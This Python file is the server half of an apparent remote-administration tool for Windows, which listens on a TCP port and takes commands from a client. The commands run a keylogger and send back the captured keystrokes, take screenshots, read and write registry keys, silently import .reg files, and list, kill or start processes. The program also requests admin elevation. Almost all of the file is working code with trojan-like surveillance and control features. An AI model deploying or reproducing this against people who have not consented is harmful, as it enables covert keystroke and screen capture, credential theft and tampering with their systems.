import os
import socket
import subprocess
import pygetwindow as gw
import ctypes
import tkinter as tk
import winreg
import sys
import mss
import psutil
from serverDesigner import ServerApp
from keylog import Keylogger
import tkinter as tk
from shutdownDesigner import open_shutdown_app
import tkinter as tk

class Server(ServerApp):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.recording = False
        self.recorded_keys = []
        self.keylogger = Keylogger()

    def receive_signal(self):
        try:
            return self.nr.readline().strip()
        except Exception:
            return "QUIT"

    def shutdown(self):
        open_shutdown_app()

    def base_registry_key(self, link):
        a = None
        if '\\' in link:
            root_key = link.split('\\')[0].upper()
            if root_key == "HKEY_CLASSES_ROOT":
                a = winreg.HKEY_CLASSES_ROOT
            elif root_key == "HKEY_CURRENT_USER":
                a = winreg.HKEY_CURRENT_USER
            elif root_key == "HKEY_LOCAL_MACHINE":
                a = winreg.HKEY_LOCAL_MACHINE
            elif root_key == "HKEY_USERS":
                a = winreg.HKEY_USERS
            elif root_key == "HKEY_CURRENT_CONFIG":
                a = winreg.HKEY_CURRENT_CONFIG
        return a

    def get_value(self, a, link, value_name):
        try:
            sub_key = winreg.OpenKey(a, link)
        except Exception as e:
            print("Error opening registry key:", e)
            return "Error"

        print("Opened registry key:", link)

        try:
            op = winreg.QueryValueEx(sub_key, value_name)
            value = op[0]
            value_type = op[1]
            print("Got value:", value_name)
            print("Value:", value)
            print("Value type:", value_type)
            winreg.CloseKey(sub_key)
            return value
        except Exception as e:
            print("Error getting registry value:", e)
            winreg.CloseKey(sub_key)
            return "Error"

    def set_value(self, a ,link, value_name, value, type_value):
        try:
            key = winreg.OpenKey(a, link, 0, winreg.KEY_SET_VALUE)
            value_type = ""
            if type_value == "String":
                value_type = winreg.REG_SZ
            elif type_value == "Multi-String":
                value_type = winreg.REG_MULTI_SZ
            elif type_value == "Expandable String":
                value_type = winreg.REG_EXPAND_SZ
            elif type_value == "DWORD":
                value_type = winreg.REG_DWORD
                value = int(value)
            elif type_value == "QWORD":
                value_type = winreg.REG_QWORD
                value = int(value)
            elif type_value == "Binary":
                value_type = winreg.REG_BINARY
                value = bytes(map(int, value.split()))
            else:
                return "Error: Invalid type"
            winreg.SetValueEx(key, value_name, 0, value_type, value)
            winreg.CloseKey(key)
            return "Value set"
        except Exception as e:
            return f"Error: {e}"

    def delete_value(self, a, link, value_name):
        try:
            key = winreg.OpenKey(a, link, 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, value_name)
            winreg.CloseKey(key)

            return("Value deleted")
        except Exception as e:
            return(f"Error: {e}")

    def delete_key(self, a, link):
        try:
            winreg.DeleteKey(a, link)
            return "Delete key successfully"
        except Exception as e:
            return f"Error: {e}"

    def create_key(self, a, link):
        try:
            key = winreg.CreateKey(a, link)
            winreg.CloseKey(key)

            return("Successful key generation")
        except Exception as e:
            return(f"Error: {e}")

    def registry(self):
        s = ""
        with open("fileReg.reg", "w") as fs:
            pass
            
        while True:
            s = self.receive_signal()
            if s == "REG":
                    data = ""
                    while True:
                        line = self.nr.readline().strip()
                        if not line:
                            break
                        data += line + "\n"
                    with open("fileReg.reg", "w") as fin:
                        fin.write(data)
                    s = os.path.join(os.path.dirname(__file__), "fileReg.reg")
                    try:
                        subprocess.run(["regedit.exe", "/s", s], timeout=20)
                        self.nw.write("Successful fix\n")
                    except Exception as ex:
                        print("Error:", ex)
                        self.nw.write("Fix failure\n")
                    self.nw.flush()
            elif s == "SEND":
                option = self.nr.readline().strip()
                link = self.nr.readline().strip()
                if(option != "Create key" or option != "Delete key"):
                    value_name = self.nr.readline().strip()
                if(option == "Set value"):
                    value = self.nr.readline().strip()
                    type_value = self.nr.readline().strip()
                a = self.base_registry_key(link)
                link2 = link[link.index('\\') + 1:]
                if a is None:
                    s = "Error"
                else:
                    if option == "Create key":
                        s = self.create_key(a, link2)
                    elif option == "Delete key":
                        s = self.delete_key(a, link2)
                    elif option == "Get value":
                        s = self.get_value(a, link2, value_name)
                    elif option == "Set value":
                        s = self.set_value(a, link2, value_name, value, type_value)
                    elif option == "Delete value":
                        s = self.delete_value(a, link2, value_name)
                    else:
                        s = "Loi"
                self.nw.write(s + "\n")
                self.nw.flush()
            elif s == "QUIT":
                return

    def take_pic(self):
        ss = ""
        
        while True:
            ss = self.receive_signal()
            if ss == "TAKE":
                with mss.mss() as sct:
                    screenshot = sct.shot()
                    with open(screenshot, "rb") as image_file:
                        image_data = image_file.read()
                        print(image_data)
                        s = str(len(image_data))
                        self.nw.write(s + "\n")
                        self.nw.flush()
                        self.client.sendall(image_data)
            elif ss == "QUIT":
                return

    def hookKey(self):
        self.keylogger.hook()

    def unhook(self):
        self.keylogger.unhook()

    def printkeys(self):
        s = self.keylogger.print()
        self.nw.write(s.replace("\n", "\r") + "\n")
        self.nw.flush()

    def key_log(self):
        s = ""
        while True:
            s = self.receive_signal()
            if s == "PRINT":
                self.printkeys()
            elif s == "HOOK":
                self.hookKey()
            elif s == "UNHOOK":
                self.unhook()
            elif s == "QUIT":
                return

    def get_process_info_from_pid(self, pid):
        try:
            process = psutil.Process(pid)
            return {
                "name": process.name().split(".exe")[0],
                "pid": process.pid,
                "num_threads": process.num_threads()
            }
        except psutil.NoSuchProcess:
            return None

    def application(self):
        ss = ""
        while True:
            ss = self.receive_signal()
            if ss == "List":
                running_apps = set()
                u = ""

                for window in gw.getWindowsWithTitle(''):
                    if window.isMinimized or not window.visible:
                        continue

                    pid = ctypes.c_ulong(0)
                    ctypes.windll.user32.GetWindowThreadProcessId(window._hWnd, ctypes.byref(pid))
                    
                    process_info = self.get_process_info_from_pid(pid.value)
                    if process_info:
                        running_apps.add((process_info["name"], process_info["pid"], process_info["num_threads"]))

                u = str(len(running_apps))
                self.nw.write(u + "\n")
                self.nw.flush()

                for app_info in running_apps:
                    print(app_info)
                    try:
                        process_name = app_info[0]
                        process_id = app_info[1]
                        process_thread_count = app_info[2]
                        u = process_name
                        self.nw.write(u + "\n")
                        self.nw.flush()
                        u = str(process_id)
                        self.nw.write(u + "\n")
                        self.nw.flush()
                        u = str(process_thread_count)
                        self.nw.write(u + "\n")
                        self.nw.flush()
                    except Exception:
                        pass
            elif ss == "KILL":
                    ss = self.receive_signal()
                    if ss == "QUIT":
                        break
                    elif ss == "KILLID":
                        u = self.nr.readline().strip()
                        test2 = False
                        if u:
                            try:
                                process_id = int(u)
                                os.kill(process_id, 9)
                                self.nw.write("Process Killed\n")
                            except Exception:
                                self.nw.write("Error\n")
                            self.nw.flush()
            elif ss == "START":
                    ss = self.receive_signal()
                    if ss == "STARTID":
                        u = self.nr.readline().strip()
                        print(u)
                        if u:
                            try:
                                u = u + ".exe"
                                subprocess.Popen([u])
                                self.nw.write("Process has been caught\n")
                                self.nw.flush()
                            except Exception as e:
                                self.nw.write("Error: {}\n".format(str(e)))
                                self.nw.flush()
                    
            elif ss == "QUIT":
                break

    def process(self):
        ss = ""
        while True:
            ss = self.receive_signal()
            if ss == "List":
                processes = []
                for process in psutil.process_iter():
                    processes.append(process)
                u = str(len(processes))
                self.nw.write(u + "\n")
                self.nw.flush()
                for p in processes:
                    print(p)
                    try:
                        process_name = p.name()
                        process_id = p.pid
                        process_thread_count = p.num_threads()
                        u = process_name
                        self.nw.write(u + "\n")
                        self.nw.flush()
                        u = str(process_id)
                        self.nw.write(u + "\n")
                        self.nw.flush()
                        u = str(process_thread_count)
                        self.nw.write(u + "\n")
                        self.nw.flush()
                    except Exception:
                        pass

            elif ss == "KILL":
                    ss = self.receive_signal()
                    if ss == "QUIT":
                        break
                    elif ss == "KILLID":
                        u = self.nr.readline().strip()
                        test2 = False
                        if u:
                            try:
                                process_id = int(u)
                                os.kill(process_id, 9)
                                self.nw.write("Process killed\n")
                            except Exception:
                                self.nw.write("Error\n")
                            self.nw.flush()
        
            elif ss == "START":
                    ss = self.receive_signal()
                    if ss == "STARTID":
                        u = self.nr.readline().strip()
                        print(u)
                        if u:
                            try:
                                u = u + ".exe"
                                subprocess.Popen([u])
                                self.nw.write("Process has been caught\n")
                                self.nw.flush()
                            except Exception as e:
                                self.nw.write("Error: {}\n".format(str(e)))
                                self.nw.flush()

            elif ss == "QUIT":
                break

    def start_server(self):
        get_ip = socket.gethostbyname(socket.gethostname())
        ip = (get_ip, 3008)
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind(ip)
        self.server.listen(100)
        print(self.server)
        print("Listening to client ...")
        self.client, _ = self.server.accept()
        self.ns = self.client.makefile('rw')
        self.nr = self.ns
        self.nw = self.ns
        s = ""
        while True:
            s = self.receive_signal()
            print(s)
            if s == "KEYLOG":
                self.key_log()
            elif s == "SHUTDOWN":
                self.shutdown()
            elif s == "REGISTRY":
                self.registry()
            if s == "TAKEPIC":
                self.take_pic()
            elif s == "PROCESS":
                self.process()
            elif s == "APPLICATION":
                self.application()
            elif s == "QUIT":
                break
        
        self.client.close()
        self.server.close()

def run_as_admin():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            print("Already running with admin privileges.")
            return True
        else:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 0)
            return False
    except Exception as e:
        print("Error:", e)
        return False

if __name__ == "__main__":
    print(socket.gethostbyname(socket.gethostname()))
    if run_as_admin():
        root = tk.Tk()
        app = Server(root)
        root.mainloop()
